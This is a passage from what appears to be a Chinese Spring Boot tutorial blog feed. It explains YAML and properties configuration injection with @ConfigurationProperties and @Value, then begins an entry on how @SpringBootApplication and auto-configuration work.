age;   <br>    <span class="hljs-keyword">private</span> Boolean happy;   <br>    <span class="hljs-keyword">private</span> Date birth;   <br>    <span class="hljs-keyword">private</span> Map&lt;String,Object&gt; maps;   <br>    <span class="hljs-keyword">private</span> List&lt;Object&gt; lists;  <br>    <span class="hljs-keyword">private</span> Dog dog;        <br>    <span class="hljs-comment">//有参无参构造、get、set方法、toString()方法  </span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>6、我们来使用yaml配置的方式进行注入，大家写的时候注意区别和优势，我们编写一个yaml配置！</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">person:</span> <br>  <span class="hljs-attr">name:</span> <span class="hljs-string">qinjiang</span>  <br>  <span class="hljs-attr">age:</span> <span class="hljs-number">3</span>  <br>  <span class="hljs-attr">happy:</span> <span class="hljs-literal">false</span>  <br>  <span class="hljs-attr">birth:</span> <span class="hljs-number">2000</span><span class="hljs-string">/01/01</span>  <br>  <span class="hljs-attr">maps:</span> &#123;<span class="hljs-attr">k1:</span> <span class="hljs-string">v1</span>,<span class="hljs-attr">k2:</span> <span class="hljs-string">v2</span>&#125;  <br>  <span class="hljs-attr">lists:</span>  <br>    <span class="hljs-bullet">-</span> <span class="hljs-string">code</span>  <br>    <span class="hljs-bullet">-</span> <span class="hljs-string">girl</span>  <br>    <span class="hljs-bullet">-</span> <span class="hljs-string">music</span>  <br>  <span class="hljs-attr">dog:</span>   <br>    <span class="hljs-attr">name:</span> <span class="hljs-string">旺财</span>    <br>    <span class="hljs-attr">age:</span> <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>7、我们刚才已经把person这个对象的所有值都写好了，我们现在来注入到我们的类中！</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/*@ConfigurationProperties作用：将配置文件中配置的每一个属性的值，映射到这个组件中；</span><br><span class="hljs-comment">告诉SpringBoot将本类中的所有属性和配置文件中相关的配置进行绑定参数 prefix = “person” : 将配置文件中的person下面的所有属性一一对应*/</span><br><span class="hljs-meta">@Component</span> <span class="hljs-comment">//注册bean</span><br><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;person&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;   <br>    <span class="hljs-keyword">private</span> String name;    <br>    <span class="hljs-keyword">private</span> Integer age;    <br>    <span class="hljs-keyword">private</span> Boolean happy;   <br>    <span class="hljs-keyword">private</span> Date birth;    <br>    <span class="hljs-keyword">private</span> Map&lt;String,Object&gt; maps;  <br>    <span class="hljs-keyword">private</span> List&lt;Object&gt; lists;  <br>    <span class="hljs-keyword">private</span> Dog dog;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>8、IDEA 提示，springboot配置注解处理器没有找到，让我们看文档，我们可以查看文档，找到一个依赖！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7KtjyIb9NEaYlz0tCWSiboOYFrPO6PAYI7eQAEVzql1Sfic03AbzpiboQLP9eWo5I2McfQ2dicibIibh0fw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7KtjyIb9NEaYlz0tCWSiboOYhxNnwKv6bDsrCvMS4OscxxV0EWU7ibUD9G0N164rxEUNfaT9NFTVU4A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 导入配置文件处理器，配置文件进行绑定就会有提示，需要重启 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>9、确认以上配置都OK之后，我们去测试类中测试一下：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootTestclass</span> DemoApplicationTests &#123;<br>    <span class="hljs-meta">@Autowired</span>    Person person; <span class="hljs-comment">//将person自动注入进来</span><br>    <span class="hljs-meta">@Test</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">contextLoads</span><span class="hljs-params">()</span> </span>&#123;        <br>        System.out.println(person); <span class="hljs-comment">//打印person信息    </span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>结果：所有值全部注入成功！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7KtjyIb9NEaYlz0tCWSiboOYTwpS5awY7ja8vibH3ncyGbgj69gSkKc80UN2AFNvTqotgkYMbw5K6zQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>yaml配置注入到实体类完全OK！</strong></p><p>课堂测试：</p><p>1、将配置文件的key 值 和 属性的值设置为不一样，则结果输出为null，注入失败</p><p>2、在配置一个person2，然后将 @ConfigurationProperties(prefix = “person2”) 指向我们的person2；</p><h2 id="加载指定的配置文件"><a href="#加载指定的配置文件" class="headerlink" title="加载指定的配置文件"></a>加载指定的配置文件</h2><p><strong>@PropertySource ：</strong>加载指定的配置文件；</p><p><strong>@configurationProperties</strong>：默认从全局配置文件中获取值；</p><p>1、我们去在resources目录下新建一个<strong>person.properties</strong>文件</p><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-attr">name</span>=<span class="hljs-string">kuangshen</span><br></code></pre></div></td></tr></table></figure><p>2、然后在我们的代码中指定加载person.properties文件</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@PropertySource(value = &quot;classpath:person.properties&quot;)</span><br><span class="hljs-meta">@Component</span> <span class="hljs-comment">//注册bean</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-meta">@Value(&quot;$&#123;name&#125;&quot;)</span>   <br>    <span class="hljs-keyword">private</span> String name;<br>    ......  <br>&#125;<br></code></pre></div></td></tr></table></figure><p>3、再次输出测试一下：指定配置文件绑定成功！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7KtjyIb9NEaYlz0tCWSiboOYAyueVvGpddTEkyGqCwbKsJrfQCbkWrZAFdL3ibMwTYhLKE9GclVyQ7A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="配置文件占位符"><a href="#配置文件占位符" class="headerlink" title="配置文件占位符"></a>配置文件占位符</h2><p>配置文件还可以编写占位符生成随机数</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">person:</span>    <br>    <span class="hljs-attr">name:</span> <span class="hljs-string">qinjiang$&#123;random.uuid&#125;</span> <br>    <span class="hljs-comment"># 随机uuid   </span><br>    <span class="hljs-attr">age:</span> <span class="hljs-string">$&#123;random.int&#125;</span>  <br>    <span class="hljs-comment"># 随机int    </span><br>    <span class="hljs-attr">happy:</span> <span class="hljs-literal">false</span>   <br>    <span class="hljs-attr">birth:</span> <span class="hljs-number">2000</span><span class="hljs-string">/01/01</span>   <br>    <span class="hljs-attr">maps:</span> &#123;<span class="hljs-attr">k1:</span> <span class="hljs-string">v1</span>,<span class="hljs-attr">k2:</span> <span class="hljs-string">v2</span>&#125;   <br>    <span class="hljs-attr">lists:</span>     <br>        <span class="hljs-bullet">-</span> <span class="hljs-string">code</span>      <br>        <span class="hljs-bullet">-</span> <span class="hljs-string">girl</span>     <br>        <span class="hljs-bullet">-</span> <span class="hljs-string">music</span>   <br>    <span class="hljs-attr">dog:</span>    <br>    <span class="hljs-attr">name:</span> <span class="hljs-string">$&#123;person.hello:other&#125;_旺财</span>     <br>        <span class="hljs-attr">age:</span> <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><h2 id="回顾properties配置"><a href="#回顾properties配置" class="headerlink" title="回顾properties配置"></a>回顾properties配置</h2><p>我们上面采用的yaml方法都是最简单的方式，开发中最常用的；也是springboot所推荐的！那我们来唠唠其他的实现方式，道理都是相同的；写还是那样写；配置文件除了yml还有我们之前常用的properties ， 我们没有讲，我们来唠唠！</p><p>【注意】properties配置文件在写中文的时候，会有乱码 ， 我们需要去IDEA中设置编码格式为UTF-8；</p><p>settings–&gt;FileEncodings 中配置；</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7KtjyIb9NEaYlz0tCWSiboOYAr9nCaBDe8o7JeMWACZicQkicqrVMeiaWFgrTamHjc668RNx4c4z8UcXw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>测试步骤：</strong></p><p>1、新建一个实体类User</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Component</span> <span class="hljs-comment">//注册bean</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;    <br>    <span class="hljs-keyword">private</span> String name; <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;  <br>    <span class="hljs-keyword">private</span> String sex;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>2、编辑配置文件 user.properties</p><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-meta">user1.name</span>=<span class="hljs-string">kuangshen</span><br><span class="hljs-meta">user1.age</span>=<span class="hljs-string">18</span><br><span class="hljs-meta">user1.sex</span>=<span class="hljs-string">男</span><br></code></pre></div></td></tr></table></figure><p>3、我们在User类上使用@Value来进行注入！</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Component</span> <span class="hljs-comment">//注册bean</span><br><span class="hljs-meta">@PropertySource(value = &quot;classpath:user.properties&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;    <br>    <span class="hljs-comment">//直接使用@value    </span><br>    <span class="hljs-meta">@Value(&quot;$&#123;user.name&#125;&quot;)</span> <br>    <span class="hljs-comment">//从配置文件中取值    </span><br>    <span class="hljs-keyword">private</span> String name;   <br>    <span class="hljs-meta">@Value(&quot;#&#123;9*2&#125;&quot;)</span> <br>    <span class="hljs-comment">// #&#123;SPEL&#125; Spring表达式   </span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;    <br>    <span class="hljs-meta">@Value(&quot;男&quot;)</span>  <span class="hljs-comment">// 字面量  </span><br>    <span class="hljs-keyword">private</span> String sex;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>4、Springboot测试</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootTestclass</span> DemoApplicationTests &#123;<br>    <span class="hljs-meta">@Autowired</span>    <br>    User user;<br>    <span class="hljs-meta">@Test</span>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">contextLoads</span><span class="hljs-params">()</span> </span>&#123;   <br>        System.out.println(user);    <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>结果正常输出：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7KtjyIb9NEaYlz0tCWSiboOYxFwDQMxmyVQjVPt794RCuhfVOEbqDrpH2u84DT8y01xAhuQh47AFYA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="对比小结"><a href="#对比小结" class="headerlink" title="对比小结"></a>对比小结</h2><p>@Value这个使用起来并不友好！我们需要为每个属性单独注解赋值，比较麻烦；我们来看个功能对比图</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7KtjyIb9NEaYlz0tCWSiboOYjMibiaov73iaTsiaWEPoArDcAB1Ooibx9uR5JxtacIuicHblEtUI9SrySX2A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>1、@ConfigurationProperties只需要写一次即可 ， @Value则需要每个字段都添加</p><p>2、松散绑定：这个什么意思呢? 比如我的yml中写的last-name，这个和lastName是一样的， - 后面跟着的字母默认是大写的。这就是松散绑定。可以测试一下</p><p>3、JSR303数据校验 ， 这个就是我们可以在字段是增加一层过滤器验证 ， 可以保证数据的合法性</p><p>4、复杂类型封装，yml中可以封装对象 ， 使用value就不支持</p><p><strong>结论：</strong></p><p>配置yml和配置properties都可以获取到值 ， 强烈推荐 yml；</p><p>如果我们在某个业务中，只需要获取配置文件中的某个值，可以使用一下 @value；</p><p>如果说，我们专门编写了一个JavaBean来和配置文件进行一一映射，就直接@configurationProperties，不要犹豫！</p>]]></content>
    
    
    <categories>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Springboot</tag>
      
      <tag>yaml</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>原理初探</title>
    <link href="/2021/04/09/SpringBoot/%E5%8E%9F%E7%90%86%E5%88%9D%E6%8E%A2/"/>
    <url>/2021/04/09/SpringBoot/%E5%8E%9F%E7%90%86%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<p>我们之前写的HelloSpringBoot，到底是怎么运行的呢，Maven项目，我们一般从pom.xml文件探究起；</p><blockquote><p><strong>pom.xml</strong></p></blockquote><h2 id="父依赖"><a href="#父依赖" class="headerlink" title="父依赖"></a>父依赖</h2><p>其中它主要是依赖一个父项目，主要是管理项目的资源过滤及插件！</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.5.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span>  <br>  <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>点进去，发现还有一个父依赖</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.5.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>&gt;</span>../../spring-boot-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">relativePath</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>这里才是真正管理SpringBoot应用里面所有依赖版本的地方，SpringBoot的版本控制中心；</p><p><strong>以后我们导入依赖默认是不需要写版本；但是如果导入的包没有在依赖中管理着就需要手动配置版本了；</strong></p><h2 id="启动器-spring-boot-starter"><a href="#启动器-spring-boot-starter" class="headerlink" title="启动器 spring-boot-starter"></a>启动器 spring-boot-starter</h2><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p><strong>springboot-boot-starter-xxx</strong>：就是spring-boot的场景启动器</p><p><strong>spring-boot-starter-web</strong>：帮我们导入了web模块正常运行所依赖的组件；</p><p>SpringBoot将所有的功能场景都抽取出来，做成一个个的starter （启动器），只需要在项目中引入这些starter即可，所有相关的依赖都会导入进来 ， 我们要用什么功能就导入什么样的场景启动器即可 ；我们未来也可以自己自定义 starter；</p><blockquote><p><strong>主启动类</strong></p></blockquote><p>分析完了 pom.xml 来看看这个启动类</p><h2 id="默认的主启动类"><a href="#默认的主启动类" class="headerlink" title="默认的主启动类"></a>默认的主启动类</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//@SpringBootApplication 来标注一个主程序类</span><br><span class="hljs-comment">//说明这是一个Spring Boot应用@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SpringbootApplication</span> </span>&#123;<br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;     <br>   <span class="hljs-comment">//以为是启动了一个方法，没想到启动了一个服务      </span><br>   SpringApplication.run(SpringbootApplication.class, args);   <br>   &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>但是<strong>一个简单的启动类并不简单！</strong>我们来分析一下这些注解都干了什么</p><h2 id="SpringBootApplication"><a href="#SpringBootApplication" class="headerlink" title="@SpringBootApplication"></a>@SpringBootApplication</h2><p>作用：标注在某个类上说明这个类是SpringBoot的主配置类 ， SpringBoot就应该运行这个类的main方法来启动SpringBoot应用；</p><p>进入这个注解：可以看到上面还有很多其他注解！</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootConfiguration</span><br><span class="hljs-meta">@EnableAutoConfiguration</span><br><span class="hljs-meta">@ComponentScan(    </span><br><span class="hljs-meta">    excludeFilters = &#123;@Filter(    </span><br><span class="hljs-meta">        type = FilterType.CUSTOM,    </span><br><span class="hljs-meta">        classes = &#123;TypeExcludeFilter.class&#125;</span><br><span class="hljs-meta">    ), @Filter(    </span><br><span class="hljs-meta">        type = FilterType.CUSTOM,    </span><br><span class="hljs-meta">        classes = &#123;AutoConfigurationExcludeFilter.class&#125;</span><br><span class="hljs-meta">    )&#125;</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> SpringBootApplication &#123;    <br>    <span class="hljs-comment">// ......</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="ComponentScan"><a href="#ComponentScan" class="headerlink" title="@ComponentScan"></a>@ComponentScan</h2><p>这个注解在Spring中很重要 ,它对应XML配置中的元素。</p><p>作用：自动扫描并加载符合条件的组件或者bean ， 将这个bean定义加载到IOC容器中</p><h2 id="SpringBootConfiguration"><a href="#SpringBootConfiguration" class="headerlink" title="@SpringBootConfiguration"></a>@SpringBootConfiguration</h2><p>作用：SpringBoot的配置类 ，标注在某个类上 ， 表示这是一个SpringBoot的配置类；</p><p>我们继续进去这个注解查看</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 点进去得到下面的 @Component</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> SpringBootConfiguration &#123;&#125;<br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Configuration &#123;&#125;<br></code></pre></div></td></tr></table></figure><p>这里的 @Configuration，说明这是一个配置类 ，配置类就是对应Spring的xml 配置文件；</p><p>里面的 @Component 这就说明，启动类本身也是Spring中的一个组件而已，负责启动应用！</p><p>我们回到 SpringBootApplication 注解中继续看。</p><h2 id="EnableAutoConfiguration"><a href="#EnableAutoConfiguration" class="headerlink" title="@EnableAutoConfiguration"></a>@EnableAutoConfiguration</h2><p><strong>@EnableAutoConfiguration ：开启自动配置功能</strong></p><p>以前我们需要自己配置的东西，而现在SpringBoot可以自动帮我们配置 ；@EnableAutoConfiguration告诉SpringBoot开启自动配置功能，这样自动配置才能生效；</p><p>点进注解接续查看：</p><p><strong>@AutoConfigurationPackage ：自动配置包</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Import(&#123;Registrar.class&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> AutoConfigurationPackage &#123;<br>    <br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>@import</strong> ：Spring底层注解@import ， 给容器中导入一个组件</p><p>Registrar.class 作用：将主启动类的所在包及包下面所有子包里面的所有组件扫描到Spring容器 ；</p><p>这个分析完了，退到上一步，继续看</p><p><strong>@Import({AutoConfigurationImportSelector.class}) ：给容器导入组件 ；</strong></p><p>AutoConfigurationImportSelector ：自动配置导入选择器，那么它会导入哪些组件的选择器呢？我们点击去这个类看源码：</p><p>1、这个类中有一个这样的方法</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 获得候选的配置</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> List&lt;String&gt; <span class="hljs-title">getCandidateConfigurations</span><span class="hljs-params">(AnnotationMetadata metadata, AnnotationAttributes attributes)</span> </span>&#123;    <br>    <span class="hljs-comment">//这里的getSpringFactoriesLoaderFactoryClass（）方法    </span><br>    <span class="hljs-comment">//返回的就是我们最开始看的启动自动导入配置文件的注解类；EnableAutoConfiguration    </span><br>    List&lt;String&gt; configurations = SpringFactoriesLoader.loadFactoryNames(<span class="hljs-keyword">this</span>.getSpringFactoriesLoaderFactoryClass(), <span class="hljs-keyword">this</span>.getBeanClassLoader());    <br>    Assert.notEmpty(configurations, <span class="hljs-string">&quot;No auto configuration classes found in META-INF/spring.factories. If you are using a custom packaging, make sure that file is correct.&quot;</span>);    <br>    <span class="hljs-keyword">return</span> configurations;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>2、这个方法又调用了  SpringFactoriesLoader 类的静态方法！我们进入SpringFactoriesLoader类loadFactoryNames() 方法</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title">loadFactoryNames</span><span class="hljs-params">(Class&lt;?&gt; factoryClass, <span class="hljs-meta">@Nullable</span> ClassLoader classLoader)</span> </span>&#123;    <br>    String factoryClassName = factoryClass.getName();    <span class="hljs-comment">//这里它又调用了 loadSpringFactories 方法    </span><br>    <span class="hljs-keyword">return</span> (List)loadSpringFactories(classLoader).getOrDefault(factoryClassName, Collections.emptyList());<br>&#125;<br></code></pre></div></td></tr></table></figure><p>3、我们继续点击查看 loadSpringFactories 方法</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 